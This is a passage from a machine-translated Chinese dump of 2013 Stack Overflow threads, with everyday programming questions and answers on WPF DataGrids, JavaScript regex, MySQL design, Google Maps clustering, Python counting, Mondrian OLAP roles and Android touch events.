4.  我不明白你在`btnSave_Click`函数中做了什么。但我假设您想将之前选择的现有文件复制到`C:\Temp\`目录中，所以我也更改了它。
    正如你现在所看到的，你可以简单地 foreach`DataGrid.Items`并用它们做你喜欢的事情。

## 所以它归结为一个非常简单的解决方案：

```
public class ReportFile
{
  public string Path { get; set; }
  public string FileName { get; set; }
}

private void buttonAttach_Click(object sender, RoutedEventArgs e)
{
  Microsoft.Win32.OpenFileDialog dlg = new Microsoft.Win32.OpenFileDialog();
  if (dlg.ShowDialog() == true)
  {
    foreach (string str in dlg.FileNames)
    {
      ReportFile reportFile = new ReportFile();
      reportFile.Path = str;
      reportFile.FileName = System.IO.Path.GetFileName(str);
      dataGrid1.Items.Add(reportFile);
    }
  }
}

private void btnSave_Click(object sender, RoutedEventArgs e)
{
  foreach (ReportFile reportFile in dataGrid1.Items)
  {
    string fileName = @"C:\Temp\" + reportFile.FileName;
    if (File.Exists(fileName))
      continue;
    else
    {
      try
      {
        File.Copy(reportFile.Path, fileName);
      }
      catch (Exception err)
      {
        MessageBox.Show(err.Message);
        return;
      }
    }
  }
} 
```

@任何模组，请删除第一个答案，因为它不再计数

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-16T09:33:19.677

基本上我正在做的是从本地驱动器收集文件并将它们全部复制到 C:\ReportFiles。我创建了两个按钮。附加并保存。附加将浏览并获取文件。在 dataGrid1 中，我采用旧路径和文件名。收集完所有文件后。点击保存按钮。这将从数据网格中获取路径列，并开始将数据网格路径列中的文件复制到 C:\ReportFiles。循环将完成这项工作。

问题是列表，我不能将数据网格列作为集合列表。希望这能清除。

**数据网格代码：**

```
<DataGrid AutoGenerateColumns="False" Height="193" HorizontalAlignment="Left" Margin="169,6,0,0" Name="dataGrid1" VerticalAlignment="Top" Width="200" ItemsSource="{Binding ReportFiles}">
                <DataGrid.Columns>
                    <DataGridTextColumn Header="Path" Binding="{Binding Path}" />
                    <DataGridTextColumn Header="FileName" Binding="{Binding FileName}" />
                </DataGrid.Columns>
            </DataGrid> 
```

**主窗口.cs：**

```
public partial class EditReport : Window
{
        public List<ReportFiles> listabove = new List<ReportFiles>();

 public class ReportFiles
    {
        public string RealName { get; set; }
        public string TargetName { get; set; }
    }

    private void buttonAttach_Click(object sender, RoutedEventArgs e)
        {
        Microsoft.Win32.OpenFileDialog dlg = new Microsoft.Win32.OpenFileDialog();
              if (dlg.ShowDialog() == true)
        {
foreach (string str in dlg.FileNames)
                     {
                     ReportFiles list = new ReportFiles();
                     list.RealName = str;
                     list.TargetName = filename;
                     dataGrid1.Items.Add(new { RealName = list.RealName, TargetName = list.TargetName });
            string fileName = @"C:\Temp\" + filename + System.IO.Path.GetExtension(str).Trim(); ;
                    if (File.Exists(fileName))
                    continue;
                    else
                        {
                        try
                        {
                             File.Copy(str, fileName);
                        }
                        catch (Exception err)
                             {
                             MessageBox.Show(err.Message);
                             return;
                             }
                        }
            }
        }
}

private void btnSave_Click(object sender, RoutedEventArgs e)
       {
            ReportFiles rep = new ReportFiles();
            DataRowView paths = (System.Data.DataRowView)dataGrid1.Items[0];
            rep.RealName = Convert.ToString(paths.Row.ItemArray[0]);

       }
} 
```

# javascript - 正则表达式特殊字符

> ID：16013466
> 
> 赞同：4
> 
> 时间：2013-04-15T10:58:56.757
> 
> 标签：javascript, regex

我已经搜索过，现有的答案都不适合我。我的问题如下：

我有这个 RegExp 代码，它搜索匹配并突出显示从第一个字母开始的匹配字母：

```
var newvals = [], regexp = new RegExp('\\b' + search.escapeRegExp(), insensitive ? 'ig' : ''); 
```

这适用于英语/美国字母，但我也有来自挪威字母“æøå”的特殊字符。知道如何更改此正则表达式以涵盖特殊字符吗？

**编辑：**应用 Sam Saint Pettersen 的提示后（谢谢！），我让它显示特殊字符，但是当我进行搜索时，自动完成现在只匹配大写或小写字母。因此，如果我输入“Ø”，它会建议所有以大写“Ø”开头的单词，而不是以小写“ø”开头的单词。小写搜索也是如此。然而，常规字母通常同时显示大写和小写。此问题仅适用于特殊字符。有任何想法吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-15T11:43:52.963

```
var re = new RegExp(/[a-z\Wæøå]+/igm); 
```

我试过反对：

> Hva heter du?
> 
> 嘿。Min navn er Søren！
> 
> S-Ø-任。
> 
> Jeg bor i et grønn hus og jeg også lærer japansk。

似乎与此相符。至少在[http://gskinner.com/RegExr/](http://gskinner.com/RegExr/)

我认为如果您将 JavaScript 保存为 UTF-8，这将起作用。挪威字母的 Unicode 转义符是：

*   Æ \u00C6, Æ \u00E6
*   Ø \u00D8, ø \u00F8
*   Å \u00C5, å \u00E5

希望这可以帮助。

# mysql - 我应该如何设置我的 MySQL 数据库的结构以满足我的需要？

> ID：16013468
> 
> 赞同：0
> 
> 时间：2013-04-15T10:58:59.393
> 
> 标签：mysql, database-design

我正在开发一个应用程序，该应用程序奖励每个类别的第一名。您成为某个类别第一的方式是在过去 30（左右）天内获得最多的选票。因此，即使您在过去 30 天内总共获得 2,000 票但仅获得 2 票，在过去 30 天内获得 10 票但获得全部 10 票的人也会排在您之前。我只是想就用 MySQL 数据库创建这种类型的系统以及如何构建数据库的最佳方法寻求建议。

我非常不确定解决此问题的最佳方法，任何建议将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:05:21.570

您必须做出的第一个决定是，是否要为每次投票保留记录：这可能会产生一个巨大的表格，但它可以让您保留大量信息，因此您可以根据信息交换存储和性能。这必须由业务逻辑而不是实现来回答。

假设您确实想要保留每张选票，请使用时间戳保存，并且您唯一需要做的就是将用户个人表与投票表连接起来，使用`WHERE`子句仅选择最后 N 天和`COUNT()`聚合来计算您的票。

如果您不想保留每张选票，则应该有一个包含人员、日期和投票计数的累积表 - 一个类似的查询，`SUM()`而不是`COUNT()`会做您想要的。

# jquery - jQuery在哪里放置dom交互

> ID：16013473
> 
> 赞同：0
> 
> 时间：2013-04-15T10:59:09.993
> 
> 标签：jquery, dom

我已经阅读了很多关于堆栈溢出的问题，但我的问题没有答案。

我在一个有很多 javascript 交互的大网站上工作。最后，我想要一个所有代码合并的文件。问题是我应该把这样的代码放在哪里

```
$('#changeMailForm').submit(/*some code here*/) // or
$('#loginForm').submit() 
```

除了用户登录之外，登录表单位于每个页面上。因此，如果用户登录，则 js 代码在文件中，它会尝试绑定提交事件。我的 js 应用程序的结构是：

```
(function(init){
    init(window.jQuery, window, document);
}(function($, window, document) {

    $(function() {

        //dom ready

    });

    // Classes, etc.

})); 
```

我应该写下每个事件并且不在乎它是否不在dom中还是应该检查它是否存在或完全不同的东西？什么是保持应用程序可扩展和可重用的最佳实践。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:07:24.710

如果用户登录并且表单不存在，jQuery 将无法找到要绑定的选择器。当然，这会对性能产生如此轻微的影响，但你可以侥幸逃脱。

或者，您可以创建一个 PHP JS 文件，该文件允许您根据正在查看的页面打印出 JS。类似 javascript.js.php?page=home 的 php 代码类似于：

```
<?php
if($_GET['page'] == 'home'){
 print "$('#changeMailForm').submit(/*some code here*/) \/\/ or";
 print "$('#loginForm').submit()";
}
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:08:35.290

您可以使用 jQuery 来处理页面中不存在的元素。如果选择器没有找到任何元素，你会得到一个空的 jQuery 对象，并且将方法应用到一个空的 jQuery 对象上什么也不做。

但是，如果您在不同的页面中有很多不同的事件处理程序，那么如果您只在每个页面中绑定您实际期望的那些事件处理程序，则更易于维护。这使得代码更易于维护，因为您可以在页面中添加元素，而无需检查站点中所有事件处理程序的列表是否存在冲突。

# javascript - 谷歌地图聚类器没有标记

> ID：16013478
> 
> 赞同：1
> 
> 时间：2013-04-15T10:59:30.270
> 
> 标签：javascript, google-maps-api-3, markerclusterer

我正在尝试将 markerclusterplus.js 与谷歌地图 api v3 一起使用。我正在遍历一组地址，对每个地址进行地理编码并添加一个标记和信息窗口。我将标记推送到一个名为标记的数组中，并使用以下代码将它们添加到我的集群中

`var markerCluster = new MarkerClusterer(map, markers);`

没有出现聚集标记。其余代码有效，如果我添加

```
map: map 
```

对于我的标记，它们显示为标准标记，所以这一切都很好。当使用警报标记数组时

```
alert(markers.toString()) 
```

什么都没有返回，所以可能没有任何东西被推送到数组中？

完整代码如下

```
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>

<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false&amp;ver=3.5.1"></script>
<script type="text/javascript" src="http://google-maps-utility-library-v3.googlecode.com/svn/trunk/markerclustererplus/src/markerclusterer.js"></script>

</head>

<body>

<script type="text/javascript">
var map; //Map variable
var geocoder; //Geocoder variable
var infowindow;
//var marker; //Marker variable
//Options variable
var myOptions = {
              zoom: 2,
              mapTypeId: google.maps.MapTypeId.ROADMAP,
              disableDefaultUI: true,
            }; 
var LatLngList = [];

//Geocoder function
function myGeocode() {

    infowindow = new google.maps.InfoWindow({
        maxWidth: 200
    });
    map = new google.maps.Map(document.getElementById("map_canvas"), myOptions);
    geocoder = new google.maps.Geocoder();
    var titles = ['Anne of Cleves House',
        'Lewes Castle',
        'Michelham Priory',
        'Fishbourne Roman Palace & Gardens',
        'Marlipins Museum','The Priest House',
        'The Long Man'
        ];

    var addresses =[
        'Anne of Cleves House, 52, Southover High St, Lewes, BN7 1JA',
        'Barbican House Museum, 169, High Street, Lewes, BN7 1YE',
        'Michelham Priory, Upper Dicker, Hailsham, East Sussex, BN27 3QS',
        'Fishbourne Roman Palace, Roman Way, Fishbourne, West Sussex, PO19 3QR',
        'Marlipins Museum, High Street, Shoreham-by-Sea, West Sussex, BN43 5DA',
        'The Priest House, North Lane, West Hoathly, West Sussex, RH19 4PP',
        'The long man of wilmington'
    ];

    var descriptions = [
        'Anne of Cleves House you can explore how the Tudors and Elizabethans lived, worked and relaxed at home.',
        'Climb to the top of this 1000 year old Norman Castle for stunning panoramic views across Sussex.',
        'England\'s longest water filled moat surrounds the site which dates back to 1229.',
        'Welcome to the largest Roman home in Britain',
        'The striking chequerboard flint and Caen limestone facade is part of one of the oldest Norman buildings in Sussex.',
        'The only one of its kind open to the public, this beautiful 15th century Wealden hall house stands in a traditional cottage garden.',
        'the long man of wilmington'
    ];

    for (var i = 0; i < addresses.length; i++) { 

        var address = addresses[i];
        var title = titles[i];
        var description = descriptions[i];
        //var alink = links[i];
        var markers = [];
        var marker;

        (function(address, title, description) {

            geocoder.geocode( {"address": address }, function(results, status) {
                if (status == google.maps.GeocoderStatus.OK) {

                    latlng = results[0].geometry.location;
                    LatLngList.push(latlng);

                    map.setCenter(latlng);

                    marker = new google.maps.Marker({
                        position: latlng
                        //map: map, 
                        //title: title,
                     }); 

                    markers.push(marker);

                    google.maps.event.addListener(marker, "click", function () {
                        infowindow.setContent("<div class='map-infowindow'><h4 class='gm-title'>"+title+"</h4>"+description+"'<a class='gm-directions' href='http://maps.google.com/maps?saddr="+address+"'>Get directions</a></div>");
                    infowindow.open(map, marker);
                    });

                } 
                else {
                  document.getElementById("text_status").value = status;
                }

            });//end of geocoder
        })(address, title, description); // <- Call function, pass the vars to be captured 
    }//end of for loop

    alert(markers.toString())
    var markerCluster = new MarkerClusterer(map, markers);

    //  Create a new viewpoint bound
    var bounds = new google.maps.LatLngBounds ();
    //  Go through each...
    for (var i = 0, LtLgLen = LatLngList.length; i < LtLgLen; i++) {
      //  And increase the bounds to take this point
      bounds.extend (LatLngList[i]);
    }
    //  Fit these bounds to the map
    map.fitBounds (bounds);

    //alert(LatLngList.join('\n'))
}

window.onload=myGeocode;
</script>

<div id="map_canvas" style="width:600px; height:600px;"></div>  

</body>

</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T12:53:11.320

首先，您每次在循环内重新定义标记数组，必须在循环外定义标记数组。

其次，geocoder.geocode 是异步工作的，所以地理编码直到循环结束之后才真正完成，甚至在你的 alert() 调用之后。

第三，没有必要在循环中使用闭包，因为每次循环都需要重新定义一个函数。在这种情况下，我总是更喜欢在当前函数中添加一个私有方法。因此，执行地理编码调用的函数只定义一次并根据需要调用。现在我们需要做的就是观察（从地理编码器的回调函数中）标记数组的长度增长，直到它与地址数组的长度相同，然后我们知道所有地理编码已经完成（当然假设一切顺利），完成事情的时间：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>

<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false&amp;ver=3.5.1"></script>
<script type="text/javascript" src="http://google-maps-utility-library-v3.googlecode.com/svn/trunk/markerclustererplus/src/markerclusterer.js"></script>
</head>
<body>
<script type="text/javascript">
var map; //Map variable
var geocoder; //Geocoder variable
var infowindow;
//var marker; //Marker variable
//Options variable
var myOptions = {
              zoom: 2,
              mapTypeId: google.maps.MapTypeId.ROADMAP,
              disableDefaultUI: true,
            }; 
var LatLngList = [];

//Geocoder function
function myGeocode() {
    infowindow = new google.maps.InfoWindow({
        maxWidth: 200
    });
    map = new google.maps.Map(document.getElementById("map_canvas"), myOptions);
    geocoder = new google.maps.Geocoder();
    var titles = [
        'Anne of Cleves House',
        'Lewes Castle',
        'Michelham Priory',
        'Fishbourne Roman Palace & Gardens',
        'Marlipins Museum','The Priest House',
        'The Long Man'
        ];

    var addresses =[
        'Anne of Cleves House, 52, Southover High St, Lewes, BN7 1JA',
        'Barbican House Museum, 169, High Street, Lewes, BN7 1YE',
        'Michelham Priory, Upper Dicker, Hailsham, East Sussex, BN27 3QS',
        'Fishbourne Roman Palace, Roman Way, Fishbourne, West Sussex, PO19 3QR',
        'Marlipins Museum, High Street, Shoreham-by-Sea, West Sussex, BN43 5DA',
        'The Priest House, North Lane, West Hoathly, West Sussex, RH19 4PP',
        'The long man of wilmington'
    ];

    var descriptions = [
        'Anne of Cleves House you can explore how the Tudors and Elizabethans lived, worked and relaxed at home.',
        'Climb to the top of this 1000 year old Norman Castle for stunning panoramic views across Sussex.',
        'England\'s longest water filled moat surrounds the site which dates back to 1229.',
        'Welcome to the largest Roman home in Britain',
        'The striking chequerboard flint and Caen limestone facade is part of one of the oldest Norman buildings in Sussex.',
        'The only one of its kind open to the public, this beautiful 15th century Wealden hall house stands in a traditional cottage garden.',
        'the long man of wilmington'
    ];
    var markers = [];
     //private function, only need be defined once!
    function getGeocode(address, title, description) {
        geocoder.geocode( {"address": address }, function(results, status) {
            if (status == google.maps.GeocoderStatus.OK) {
                latlng = results[0].geometry.location;
                LatLngList.push(latlng);
                map.setCenter(latlng);
                var marker = new google.maps.Marker({
                    position: latlng,
                    map: map
                    //title: title,
                }); 
                markers.push(marker);
                google.maps.event.addListener(marker, "click", function () {
                    infowindow.setContent("<div class='map-infowindow'><h4 class='gm-title'>"+title+"</h4>"+description+"'<a class='gm-directions' href='http://maps.google.com/maps?saddr="+address+"'>Get directions</a></div>");
                    infowindow.open(map, marker);
                });
                if (markers.length == addresses.length) { //we have received all of our geocoder responses
                    alert(markers);
                    var markerCluster = new MarkerClusterer(map, markers);
                    //  Create a new viewpoint bound
                    var bounds = new google.maps.LatLngBounds ();
                    //  Go through each...
                    for (var i = 0, LtLgLen = LatLngList.length; i < LtLgLen; i++) {
                        //  And increase the bounds to take this point
                        bounds.extend (LatLngList[i]);
                    }
                    //  Fit these bounds to the map
                    map.fitBounds (bounds);
                }
            } else {
                document.getElementById("text_status").value = status;
            }
        });//end of geocoder
    }
    for (var i = 0; i < addresses.length; i++) { 
        var address = addresses[i];
        var title = titles[i];
        var description = descriptions[i];
        //var alink = links[i];
         //put our private function to work:
        getGeocode(address, title, description);
    }//end of for loop
}

window.onload=myGeocode;
</script>
<div id="map_canvas" style="width:600px; height:600px;"></div>  
</body>
</html> 
```

# android - 在android中旋转画布后获取当前使用画布绘制的线坐标

> ID：16013483
> 
> 赞同：0
> 
> 时间：2013-04-15T10:59:39.380
> 
> 标签：android, canvas, rotation

嗨，我是android的新手，实际上我正在开发一个具有不同角度和不同边的四边多边形，但问题在于当我将多边形的任何边旋转到一定程度时，线的末端坐标会发生变化，我需要新的坐标请帮忙需要遵循的是我的代码

canvas.drawLine(100, 600, 600, 600, p);

```
 canvas.save();
    canvas.rotate(-10, 600, 600);
    canvas.drawLine(600, 600, 600, 100, p);// i need the latest coordinates after rotation
    canvas.restore();
    canvas.save();

    canvas.drawLine(100, 600, 100, 100, p);

    canvas.save();

     canvas.restore(); 
```

# python - 计算元组列表中出现的次数

> ID：16013485
> 
> 赞同：27
> 
> 时间：2013-04-15T10:59:41.390
> 
> 标签：python, list, tuples, counting

我对python相当陌生，但我无法在任何地方找到解决我的问题的方法。

我想计算元组列表中字符串的出现次数。

这是元组的列表：

```
list1 = [
         ('12392', 'some string', 'some other string'),
         ('12392', 'some new string', 'some other string'),
         ('7862', None, 'some other string')
        ] 
```

我试过了，但它只打印 0

```
for entry in list1:
    print list1.count(entry[0]) 
```

由于相同的 ID 在列表中出现两次，这应该返回：

```
2
1 
```

我还尝试为每次出现相同的 ID 增加一个计数器，但不能完全掌握如何编写它。

*编辑：使用 Eumiro 的绝妙答案。我才意识到我没有解释整个问题。我实际上需要值大于 1 的条目总数。但是如果我尝试这样做：

```
for name, value in list1:

    if value > 1:
        print value 
```

我收到此错误：

```
ValueError: Too many values to unpack 
```

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2013-04-15T11:01:27.060

也许[`collections.Counter`](https://docs.python.org/3/library/collections.html#collections.Counter)可以解决您的问题：

```
from collections import Counter
Counter(elem[0] for elem in list1) 
```

返回

```
Counter({'12392': 2, '7862': 1}) 
```

它很快，因为它只遍历您的列表一次。您迭代条目，然后尝试在列表中获取这些条目的计数。这不能用 来完成`.count`，但可以按如下方式完成：

```
for entry in list1:
    print(sum(1 for elem in list1 if elem[0] == entry[0])) 
```

但说真的，看看`collections.Counter`。

**编辑**：*我实际上需要值大于 1 的条目总数。*

您仍然可以使用`Counter`：

```
c = Counter(elem[0] for elem in list1)
sum(v for k, v in c.iteritems() if v > 1) 
```

返回`2`，即大于 1 的计数总和。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-15T11:11:06.323

`list1.count(entry[0])`将不起作用，因为它会查看 中的三个元组中的每一个`list1`，例如。`('12392', 'some string', 'some other string')`并检查它们是否等于`'12392'`例如，这显然不是这种情况。

@eurmiro 的回答向您展示了如何使用`Counter`（这是最好的方法！），但这里有一个穷人的版本来说明如何`Counter`使用字典以及`dict.get(k, [,d])`尝试获取密钥（`k`）的方法，但如果它没有t 存在它返回默认值而不是 ( `d`)：

```
>>> list1 = [
         ('12392', 'some string', 'some other string'),
         ('12392', 'some new string', 'some other string'),
         ('7862', None, 'some other string')
]
>>> d = {}
>>> for x, y, z in list1:
        d[x] = d.get(x, 0) + 1

>>> d
{'12392': 2, '7862': 1} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2019-01-24T06:49:57.013

我需要一些 Counter 没有的额外功能。我有一个元组列表，第一个元素是键，第二个元素是要添加的数量。@jamylak 解决方案对此进行了很好的改编！

```
>>> list = [(0,5), (3,2), (2,1), (0,2), (3,4)]

>>> d = {}
>>> for x, y in list1:
    d[x] = d.get(x, 0) + y

>>> d
{0: 7, 2: 1, 3: 6} 
```

# .net - 从文本编辑器捕获文本

> ID：16013502
> 
> 赞同：0
> 
> 时间：2013-04-15T11:00:39.310
> 
> 标签：.net

我在互联网上进行了研究，但我找不到。sqlassistant 之类的程序如何从其他文本编辑器（notepad++、sql management studio 等）捕获文本

例如，如果您在记事本++中按 ctrl + 鼠标左键单击，则 sql 助手会检测文本并将其重新绘制为蓝色并打开在其自己的窗口中单击的存储过程。

Hook api可以吗？我下载了许多用 c# 编写的 api 示例，但没有关于捕获文本的示例，是否可以使用托管代码？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:03:28.547

类似的程序使用常规的 Win32 API 调用来检查窗口上下文。他们使用全局键盘挂钩来检测按键，然后使用 GetActiveWindow 之类的调用来确定选择了哪种窗口/控件以及如何与之交互。

[这是在 C# 中设置全局挂钩的示例](http://www.codeproject.com/Articles/7294/Processing-Global-Mouse-and-Keyboard-Hooks-in-C)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:10:31.410

您可以使用 Win32 API 函数来获取对象/对象的内容 一些 win32 api 函数，如 getwindow-getwindowex-findwindow-findwindowex 等来自 user32.dll 可以在[www.daneshjooyar.com](http://www.daneshjooyar.com)有用，有一些关于使用 api 函数的视频在c#中

# c# - DotCover 为虚拟方法模拟显示 0%

> ID：16013505
> 
> 赞同：1
> 
> 时间：2013-04-15T11:00:46.400
> 
> 标签：c#, unit-testing, mocking

我正在使用 DotCover 检查单元测试覆盖率。在我从 SearchResult 中的活动目录返回结果的方法之一中，我模拟了该类，但 DotCover 显示 0%

```
public virtual T SearchOneRecord(ISearchConfigurator configurator)
    {
        var record = (T)Activator.CreateInstance(typeof(T));
        var searchResult = configurator.DirectorySearcher.FindOne();
        if (searchResult != null)
        {
            AssignActiveDirectoryValue(searchResult, record);
        }

        return record;
    }

[Test]
    public void SearchOneRecord()
    {
        //Arrange
        var configuratorMock = MockRepository.GenerateMock<ISearchConfigurator>();
        var searchMock = MockRepository.GenerateStub<Searcher<NativeDs>>();
        searchMock.Replay();

        var nativeDs = new NativeDs() { PasswordAge = 100 };
        searchMock.Expect(x => x.SearchOneRecord(configuratorMock)).Return(nativeDs);

        //Act
        var record = searchMock.SearchOneRecord(configuratorMock);

        //Assert
        Assert.AreEqual(nativeDs.PasswordAge, record.PasswordAge);
    } 
```

测试通过了，但由于我是 RhinoMock 的新手（一般是在模拟），所以可能存在问题。

任何的想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:11:30.557

如果我错了，请纠正我，但你在这里所做的是定义模拟，然后测试这个模拟是否正常工作？我不认为这是你想要达到的目标。当然它会导致测试通过 - 模拟工作正常，但它根本没有测试你的应用程序代码 - 因此覆盖率为 0%。

您想要做的可能是模拟`ISearchConfigurator`实例，然后将该模拟作为参数传递给方法。

```
[Test]
public void SearchOneRecord()
{
    //Arrange
    var configuratorMock = MockRepository.GenerateMock<ISearchConfigurator>();
    var directorySearcherMock = MockRepository.GenerateMock<IDirectorySearcher>(); // please note I don't know exact type, so you need to ammend it
    var returnValue = ... // initialize with types you expect DirectorySearcher to return
    var searcher = new Searcher(); // initialize class you actually want to test
    configurationMock.Replay();

    configurationMock.Expect(x => x.DirectorySearcher).Return(directorySearcherMock);
    directorySearcher.Expect(x => x.FindOne()).Return(returnValue);
    searchMock.Expect(x => x.SearchOneRecord(configuratorMock)).Return(nativeDs);

    //Act
    var record = searcher.SearchOneRecord(configuratorMock);

    //Assert
    Assert.AreEqual(nativeDs.PasswordAge, record.PasswordAge);
} 
```

请注意，我目前无法测试此代码，但它应该为您提供一些关于它应该如何完成的指导。

# lwuit - LWUIT 1.5 VKB 问题

> ID：16013506
> 
> 赞同：0
> 
> 时间：2013-04-15T11:00:48.313
> 
> 标签：lwuit, codenameone, lwuit-textarea, lwuit-textfield

通过 LWUIT 1.5 打开的 BB 原生键盘存在以下问题，

*   BB 的 EditField，如果添加到表单的底部，则不会向上滚动。
*   当我输入内容时，我得到一个矩形框（如选择器或放大镜），然后再次单击文本区域
*   当我有 2 个文本字段时，当我单击第一个时，对其进行编辑。点同一个文本区域（放大镜弹出）然后点击第二个文本区域，保留前一个的VKB。它没有关闭。

如果在 Codenameone 中解决了组件的向上滚动，请帮助我在 LWUIT 1.5 中也解决相同的问题。

请在这方面帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-17T18:39:15.220

这个问题不是很清楚这个问题。我们在 Codename One 中有一些用于在 Blackberry 上进行文本编辑的补丁，例如特殊的 TextField 属性，例如

```
ta1.putClientProperty("RIM.nativePopup", "true"); 
```

# mdx - Pentaho Mondrian OLAP 模式角色

> ID：16013510
> 
> 赞同：2
> 
> 时间：2013-04-15T11:01:10.627
> 
> 标签：mdx, pentaho, mondrian, xmla

我有一个 Mondrian 服务器 webapp 启动并运行以处理 MDX 查询，从 Mondrian Schema 中定义的 OLAP 多维数据集获取数据，并返回前端 GUI 应用程序所需的 XMLA 以显示查询的数据。

这一切都有效，但现在我正在尝试添加权限角色，我偶然发现了一个非常令人困惑的问题。

现在我认为这就像添加另一个参数“角色”并发送它一样简单。但是，这给了我一个奇怪的错误。

我正在使用 SmartGWT 连接到 Mondrian XMLA 服务。

```
 public static OlapConnection getConnection() throws Exception {
    Class.forName("org.olap4j.driver.xmla.XmlaOlap4jDriver");
    java.util.Properties p = new Properties();
    String role = "role1";
    p.put("server", "http://domain.be:8080/mondrian/xmla");
    p.put("user", "user");
    p.put("password", "password");
    p.put("role","\""+role+"\"");
    String dbUrl = "jdbc:xmla:";
    Connection connectionXMLA = DriverManager.getConnection(dbUrl, p);
    OlapWrapper wrapper = (OlapWrapper) connectionXMLA;
    OlapConnection olapConnection = wrapper.unwrap(OlapConnection.class);
    return olapConnection; 
```

角色在也包含多维数据集的架构中定义，如下所示：

```
<Role name="role1">
<SchemaGrant access="none">
      <CubeGrant cube="VehicleSales" access="all"/>
  <CubeGrant cube="Contract" access="none"/>
</SchemaGrant> 
```

```
<Role name="role2">
<SchemaGrant access="none">
      <CubeGrant cube="VehicleSales" access="none"/>
  <CubeGrant cube="Contract" access="all"/>
</SchemaGrant> 
```

使用“角色”参数时，我收到此错误：

> 12:30:50.930 [错误] [smartgwtolap] 12:30:50.928:TMR9:WARN:RPCManager:org.olap4j.OlapException: XMLA
> 
> 提供者给出了例外：
> 
> ```
> <faultcode>
>     SOAP-ENV:Server.00HSBB01
> </faultcode>
> <faultstring>
>     XMLA SOAP Body processing error
> </faultstring>
> <faultactor>
>     Mondrian
> </faultactor>
> <detail>
>     <XA:error xmlns:XA="mondrian sourceforge net">
>         <code>
>             00HSBB01
>         </code>
>         <desc>
>             The Mondrian XML: Mondrian Error:Internal error: Rowset 'DISCOVER_PROPERTIES' does not support property 'Roles'
>         </desc>
>     </XA:error>
> </detail>
>  </SOAP-ENV:Fault> 
> ```
> 
> 请求是：DISCOVER_PROPERTIES “role1”；数据未定义 - 响应：{operationId：“listCubes_fetch”，clientContext：Obj，上下文：Obj，transactionNum：0，httpResponseCode：200，httpResponseText：“//isc_RPCResponseStart-->[{“data”：“org.o ... “[1497]，xmlHttpRequest：Obj，传输：“xmlHttpRequest”，状态：-1，clientOnly：undef，httpHeaders：Obj，isStructured：true，callbackArgs：null，结果：Obj，数据：“org.olap4j.OlapException：XMLA提供者...“[1243]，invalidateCache：假，isDSResponse：真，queueStatus：-1，startRow：0，endRow：0，totalRows：0}com.smartgwt.client.core.JsObject$SGWT_WARN：12:30： 50.928:TMR9:WARN:RPCManager:org.olap4j。 `00HSBB01` 蒙德里安 XML：蒙德里安错误：内部错误：行集“DISCOVER_PROPERTIES”不支持属性“角色”
> 请求是：DISCOVER_PROPERTIES “role1”；数据未定义 - 响应：{operationId：“listCubes_fetch”，clientContext：Obj，上下文：Obj，transactionNum：0，httpResponseCode：200，httpResponseText：“//isc_RPCResponseStart-->[{“data”：“org.o ... “[1497]，xmlHttpRequest：Obj，传输：“xmlHttpRequest”，状态：-1，clientOnly：undef，httpHeaders：Obj，isStructured：true，callbackArgs：null，结果：Obj，数据：“org.olap4j.OlapException：XMLA provider ..."[1243]，invalidateCache：false，isDSResponse：true，queueStatus：-1，startRow：0，endRow：0，totalRows：0} 在 sun.reflect.NativeConstructorAccessorImpl。

其他随机参数，例如“foo”或“bar”，不会返回任何错误，并且会被忽略。所以“角色”肯定会触发一些东西，但遗憾的是不是我可以使用的任何东西。

任何人都可以提供一些见解？这是非常赞赏。我发现了关于 Pentaho XmlaHandler 的一些东西，它接受一个角色作为参数，但这似乎是在 Mondrian 内部使用的东西，不一定是我可以立即在 SmartGWT 中使用的东西——我想。

谢谢阅读！

## 编辑

下面的代码段返回错误：

java.lang.RuntimeException: org.olap4j.OlapException: 获取数据库产品名失败。

```
 Connection connectionXMLA = DriverManager.getConnection(dbUrl, p);
    OlapWrapper wrapper = (OlapWrapper) connectionXMLA;
    OlapConnection olapConnection = wrapper.unwrap(OlapConnection.class);
    String role = "role2";
    olapConnection.setRoleName(role);
    return olapConnection; 
```

getAvailableRoleNames() 函数确实返回架构文件中指定的角色。如果我注释掉 setRoleName(role) 部分，它工作得很好。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T23:04:44.730

这不是在 olap4j 中设置角色的方法。尝试使用[OlapConnection.setRoleName](http://olap4j.org/api/org/olap4j/OlapConnection.html#setRoleName%28java.lang.String%29)。

# android - 如何过滤一些触摸事件并让它们在 Android 中从一个视图传递到另一个视图？

> ID：16013513
> 
> 赞同：0
> 
> 时间：2013-04-15T11:01:22.320
> 
> 标签：android

我想做以下任何一项。

1) 只允许在我的视图上滑动/滑动并禁用单击、长按和其他事件。

或者

2）在我的视图之上覆盖另一个视图，只允许滑动/甩动/滚动事件传递到它下面的视图。

是否有可能在Android中做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T14:08:07.300

使用示例`GetureDetector`。

```
public class Main extends Activity implements OnGestureListener {
    private GestureDetector gDetector;
    TextView ViewA;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    gDetector = new GestureDetector(this);
    ViewA = (TextView)findViewById(R.id.txtView);

}
 @Override
public boolean onTouchEvent(MotionEvent me) {
    return gestureScanner.onTouchEvent(me);
}

@Override
public boolean onDown(MotionEvent e) {
